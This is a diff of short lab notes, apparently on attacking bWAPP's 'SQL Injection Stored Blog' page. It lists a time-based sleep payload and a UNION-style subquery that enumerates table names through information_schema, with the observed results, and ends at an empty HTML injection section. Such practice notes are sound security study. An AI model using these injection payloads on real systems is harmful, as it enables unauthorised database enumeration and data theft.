@@ -1,4 +1,7 @@
-*SQL Injection Stored Blog*
+SQL Injection Stored Blog
+*****************
+* SQL INJECTION *
+*****************
 
 cotton candy'/sleep(15)/'
   result: causes the web page to "sleep" for 15 seconds and post the blog entry
@@ -16,3 +19,7 @@ then
 enummeration', (select table_name from information_schema.tables where table_schema='bWAPP' limit 1,1))-- 
   result: owner in new post is table name, continue
   
+******************
+* HTML INJECTION *
+******************
+<
